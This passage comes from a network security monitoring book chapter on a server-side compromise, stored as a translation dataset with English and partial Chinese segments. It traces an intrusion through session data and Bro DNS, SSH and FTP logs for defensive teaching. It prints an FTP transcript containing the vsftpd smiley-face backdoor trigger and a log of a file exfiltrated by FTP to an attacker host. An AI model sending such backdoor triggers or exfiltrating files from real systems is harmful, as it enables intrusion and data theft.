- en: those passwords, he can access the system directly, rather than needing to
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
- en: break into it using an exploit.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
- en: We now understand a good deal about this case, but is that the end of
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
- en: the story?
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
- en: '***What Else Did the Intruder Do?***'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
- en: In order to determine a bit more about what happened, we need to take
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
- en: a closer look at two other aspects of this case. First, notice in Figure 10-8
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
- en: that 192.168.3.5 wasn’t the only target of 203.0.113.10\. We also see activity
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
- en: '**222** Chapter 10'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
- en: involving ports 21 and 6200 TCP to 192.168.3.13\. We generate a transcript for
    port 21 TCP to see what happened to 192.168.3.13\. Listing 10-10 shows
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
- en: the result.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:46:37'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1_1362865597000002352'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10 (Unknown)'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.13x (Unknown)'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 49220'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 21v'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:49220 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 2 hrs) OS Fingerprint: -> 192.168.3.13:21 (link: ethernet/modem)'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 220 (vsFTPd 2.3.5)w'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: USER 1dxF:)u'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 331 Please specify the password.'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PASS 0ibjZ'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 530 Login incorrect.y'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 500 OOPS:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: vsf_sysutil_recv_peek: no data'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-10: Transcript of FTP connection from 203.0.113.10 to 192.168.3.13*'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
- en: We can see that the intruder tried the same smiley face attack u against
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
- en: an FTP server v and w on 192.168.3.13 x, but that he received a rude Login
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
- en: incorrect error y in return. The attack failed. Furthermore, according to
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
- en: the NSM session data, no connections were made to port 6200 TCP on
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13, which tells us that 192.168.3.13 was not affected by this attack.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
- en: Now we must determine what else may have happened to 192.168.3.5\.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
- en: We saw the intruder connect to the FTP server and interact with a back-
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
- en: door. Did he do anything beyond that? To answer this question, we run a
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
- en: new session data query for all sessions involving the victim 192.168.3.5, as
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
- en: shown in Listing 10-11\. The results are shown in Figure 10-11\.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
- en: WHERE sancp.start_time > '2013-03-09' AND sancp.src_ip = INET_
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
- en: ATON('192.168.3.5') AND dst_port!=137 AND dst_port!=138
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-11: Search syntax for session data involving 192.168.3.5*'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
- en: When running this query, I added commands to ignore ports 137 and
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
- en: 138 because when I first reviewed the data, I saw many irrelevant session
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
- en: records for these Windows services. Because they are not germane to this
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
- en: incident, I’ve removed them from the output shown in Figure 10-11\.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **223**
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 131](index-258_1.png)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-11: Session data for 192.168.3.5*'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
- en: We’ve seen some of this activity in earlier results, but our focus here
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
- en: is 192.168.3.5, not 203.0.113.10\. The most interesting new records involve
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: 'two new IP addresses in the 203.0.113.0/24 net block: 203.0.113.77 and'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4\. These two IP addresses appear in the session records begin-
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
- en: ning at 2013-03-10 01:59:43\. Apparently, our original intruder is either
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
- en: cooperating with colleagues or he controls those systems!
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: I recommend creating at least notional diagrams of systems involved in
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
- en: NSM when trying to understand the scope of an incident. You will not iden-
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
- en: tify all of the infrastructure between victim systems and remote attackers,
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
- en: but depicting them visually can help you better recognize what is happening
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
- en: in real-world cases. Figure 10-12 summarizes our current understanding of
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
- en: all of the systems involved in this case.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
- en: '**exploring the Session data**'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
- en: Let’s consider the new sessions unearthed by querying the victim IP address
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
- en: 'to determine the scope of the incident, bearing in mind this simple rule:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
- en: The only constant in an intrusion is the victim. Intruders may try to obfus-
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
- en: cate their activities by changing attacking systems, hopping from attacking
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
- en: platform to attacking platform; incident responders who fixate on attacker
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
- en: IP addresses will miss these jumps. Keep the victim in mind, and you won’t
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
- en: be fooled.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
- en: '**224** Chapter 10'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 3
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
- en: Test
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
- en: Server
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-12: Systems observed in this case*'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
- en: Notice in Figure 10-11 that we start with the three DNS queries made
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
- en: by 192.168.3.5 beginning with 2013-03-09 21:40:35\. We could use the Sguil
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
- en: console to try to generate Wireshark output for each session in order to see
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
- en: the queries and replies, but instead, we’ll refer to DNS logs captured by Bro,
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
- en: stored in the */nsm/bro/logs/2013-03-09* directory. As you’ll see, the Bro logs
    are a form of transaction data and metadata.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
- en: '***Searching Bro DNS Logs***'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
- en: There are many ways to search Bro DNS logs for specific entries. One simple
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
- en: way is from the command line, as shown in Listing 10-12\.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | bro-cut -d | grep 192.168.3.5 |**
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
- en: '**grep -v WORKGROUP**'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:40:35+0000 k3hPbe4s2H2 192.168.3.5u 60307
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 40264 2.3.168.192.in-addr.arpaw 1
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 12 PTRv - - F F T F
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
- en: 0 --
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:47:08+0000 i1zTu4rfvvk 192.168.3.5x 36911
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 62798 www.google.comz 1
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 1 A - - F F T F
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
- en: 0 - -
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:47:18+0000 H5Wjg7kx02d 192.168.3.5y 49467
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 32005 www.google.com.localdomain{ 1
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 1 A - - F F T F
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
- en: 0 --
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-12: DNS records logged by Bro*'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **225**
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
- en: First, we use zcat, because the Bro log is *gzip*-compressed. Next, we pipe
    the result into bro-cut with the -d switch, which converts Bro’s native Unix
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
- en: epoch time format into a human-readable version. We then grep for the IP
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
- en: address of the victim, 192.168.3.5, followed by a grep to ignore (using the
    -v
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
- en: switch) any records containing WORKGROUP. Bro’s log contains DNS queries and
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
- en: replies, as well as logs of NetBIOS name service traffic, which we remove
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
- en: with bro-cut -d. By default, that syntax omits the headers for these records.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Listing 10-12, 192.168.3.5 u queried for a PTR record v
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
- en: for *2.3.168.192.in-addr.arpa* w, which is probably not related to the intrusion.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
- en: Then seven minutes later, the system x y queried for *www.google.com* z and
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
- en: '*www.google.com.localdomain* {. These last two DNS queries correspond to'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
- en: the intruder’s attempt to ping *www.google.com*. Seeing the header in Bro logs
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
- en: can help us better understand them. One way to see header data is to avoid
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
- en: piping the output through bro-cut. Instead, limit the output using the head
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
- en: command, as shown in Listing 10-13\.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | head**
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
- en: '#path dns'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-09-21-31-10'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
- en: id.resp_p proto trans_id query qclass qclass_name qtype
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
- en: qtype_name rcode rcode_name AA TC RD RA Z
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
- en: answers TTLs
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
- en: '#types time string addr port addr port enum count string'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
- en: count string count string count string bool bool bool bool
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
- en: count vector[string] vector[interval]
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-13: Fields and datatypes in the Bro DNS log*'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
- en: '***Searching Bro SSH Logs***'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
- en: Following the three DNS entries, Figure 10-11 shows 203.0.113.77 pinging
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 via IP protocol 0, ICMP. This is the first traffic we’ve seen from
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77\.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
- en: The next record shows traffic from 203.0.113.77 to port 22 TCP on
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5\. This is likely SSH traffic, which we can confirm by looking at
    full
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
- en: content data or by checking a few Bro logs. For example, in the *2013-03-10*
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
- en: directory, we see the entry shown in Listing 10-14 in *ssh.log*. (Note that
    in
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
- en: order to see the headers for the fields, we omit using bro-cut, as we did for
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-13.) The listing shows the entire log since it contains only one
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
- en: entry of interest.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
- en: '**226** Chapter 10'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz | bro-cut -d**
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-10T02:01:10+0000 8zAB2nsjjYd 203.0.113.77u 65438
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5v 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
- en: FreeBSD-20110503 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 16678 AU
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
- en: '- - - -'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-14: SSH connection logged by Bro*'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-14 shows 203.0.113.77 u connected via SSH to 192.168.3.5 v.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
- en: To understand the rest of the fields, we need to know the headers for the
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
- en: logfile. Listing 10-15 shows the headers in a Bro SSH log followed by the
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
- en: same SSH record for 203.0.113.77 connecting to 192.168.3.5\.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz**
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
- en: '#path ssh'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-10-02-03-29'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
- en: id.resp_p status direction client server resp_size
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
- en: remote_location.country_code remote_location.region remote_location.city
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
- en: remote_location.latitude remote_location.longitude
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
- en: '#types time string addr port addr port string enum string'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
- en: string count string string string double double
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
- en: 1362880870.544761 8zAB2nsjjYd 203.0.113.77 65438
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 1362880870.544761 8zAB2nsjjYd 203.0.113.77 65438
- en: 192.168.3.5 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5 22 成功 INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
- en: FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v 16678 AU
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v 16678 AU
- en: '- - - -'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: '- - - -'
- en: '#close 2013-03-10-03-00-00'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: '#close 2013-03-10-03-00-00'
- en: '*Listing 10-15: SSH connection logged by Bro, with headers*'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 10-15：由 Bro 记录的 SSH 连接，带有头部信息*'
- en: The client and server fields are the most interesting. The client is listed
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端和服务器字段最为有趣。客户端列出
- en: as SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u, and the server is
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 作为 SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u，服务器是
- en: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v. While you can easily identify the
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v。虽然你可以轻松识别出
- en: server version of SSH because you own the system, the information that the
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 的服务器版本，因为你拥有该系统，系统提供的信息
- en: client (the intruder) runs FreeBSD may be interesting. Knowing the exact
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端（入侵者）运行 FreeBSD，可能是有趣的。知道确切的
- en: version of OpenSSH on the client (again, the intruder) may also help you to
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端的 OpenSSH 版本（再次，入侵者）也可能帮助你
- en: attribute the attack or to correlate it with other incident data.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 将攻击归因或将其与其他事件数据关联。
- en: Unfortunately, the contents of the SSH session are encrypted, meaning
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，SSH 会话的内容是加密的，意味着
- en: that you can’t decipher them using network-centric means. If the system
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 你不能通过网络中心手段解密它们。如果系统
- en: had a host-centric tool like OSSEC installed, you might have had data avail-
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 如果安装了类似 OSSEC 的主机中心工具，可能已经有数据可用-
- en: able from the local system for inspection, but the session records show the
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 可以从本地系统进行检查，但会话记录显示了
- en: SSH session beginning at 2013-03-10 02:01:10 and terminating at 02:03:24\.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-10 02:01:10 开始的 SSH 会话并在 02:03:24 终止\。
- en: Can we tell what the intruder did in this encrypted session? The last few ses-
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能否通过这个加密会话知道入侵者做了什么？最后几个会话-
- en: sion records help answer that question.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 会话记录有助于回答这个问题。
- en: Server-side Compromise **227**
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端的妥协 **227**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Searching Bro FTP Logs***'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: '***搜索 Bro FTP 日志***'
- en: At 2013-03-10 02:02:50 in Figure 10-11, we see an outbound FTP session
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 在 2013-03-10 02:02:50 的图 10-11 中，我们看到一个出站的 FTP 会话
- en: from 192.168.3.5 to 203.0.113.4\. If this is truly an FTP session, we should
    be
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 从 192.168.3.5 到 203.0.113.4。如果这确实是一个 FTP 会话，我们应该是
- en: able to build a transcript to see the contents. We can also quickly check the
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 可以构建转录以查看内容。我们还可以快速检查
- en: Bro FTP log, as shown in Listing 10-16\.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: Bro FTP 日志，如清单 10-16 所示\。
- en: $ **zcat ftp.02\:03\:11-03\:00\:00.log.gz**
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat ftp.02\:03\:11-03\:00\:00.log.gz**
- en: '#separator \x09'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: '#separator \x09'
- en: '#set_separator ,'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: '#set_separator ,'
- en: '#empty_field (empty)'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: '#empty_field（空）'
- en: '#unset_field -'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: '#unset_field -'
- en: '#path ftpv'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: '#path ftpv'
- en: '#open 2013-03-10-02-03-11'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: '#open 2013-03-10-02-03-11'
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: '#fields ts uid id.orig_h id.orig_p id.resp_h'
- en: id.resp_p user password command arg mime_type mime_
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: id.resp_p 用户 密码 命令 参数 mime_type mime_
- en: desc file_size reply_code reply_msg tags
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 描述 文件大小 回复代码 回复消息 标签
- en: extraction_file
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: extraction_file
- en: '#types time string addr port addr port string string string'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: '#types 时间 字符串 地址 端口 地址 端口 字符串 字符串 字符串'
- en: string string string count count string table[string] file
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 字符串 字符串 数量 数量 字符串 表格[字符串] 文件
- en: 1362880986.113638 FVmgKldpQO5 192.168.3.5w 32904
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 1362880986.113638 FVmgKldpQO5 192.168.3.5w 32904
- en: 203.0.113.4x 21 orr <hidden> STOR ftp://203.0.113.4/./
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.4x 21 orr <隐藏> STOR ftp://203.0.113.4/./
- en: mysql-ssl.tar.gzu application/x-gzip gzip compressed data, from
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl.tar.gzu application/x-gzip gzip 压缩数据，来自
- en: FAT filesystem (MS-DOS, OS/2, NT) - 226 Transfer complete.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: FAT 文件系统（MS-DOS、OS/2、NT） - 226 传输完成。
- en: '- -'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: '- -'
- en: '#close 2013-03-10-03-00-00'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: '#close 2013-03-10-03-00-00'
- en: '*Listing 10-16: Bro FTP log*'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 10-16：Bro FTP 日志*'
- en: Here, we see that someone successfully transferred a file titled
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们看到有人成功地传输了一个名为的文件
- en: '*mysql-ssl.tar.gz* u via FTP v from 192.168.3.5 w to 203.0.113.4 x. The'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '*mysql-ssl.tar.gz* 通过 FTP 从 192.168.3.5 传输到 203.0.113.4。该'
- en: transcript shows a little more information, as shown in Listing 10-17\.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 转录显示了更多的信息，如清单 10-17 所示\。
- en: 'Sensor Name: sovm-eth1'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 传感器名称：sovm-eth1
- en: 'Timestamp: 2013-03-10 02:02:50'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 时间戳：2013-03-10 02:02:50
- en: 'Connection ID: .sovm-eth1_1362880970000002980'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 连接 ID：.sovm-eth1_1362880970000002980
- en: 'Src IP: 192.168.3.5 (Unknown)'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 源 IP：192.168.3.5（未知）
- en: 'Dst IP: 203.0.113.4 (Unknown)'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 目标 IP：203.0.113.4（未知）
- en: 'Src Port: 32904'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 源端口：32904
- en: 'Dst Port: 21'
  id: totrans-240
  prefs: []
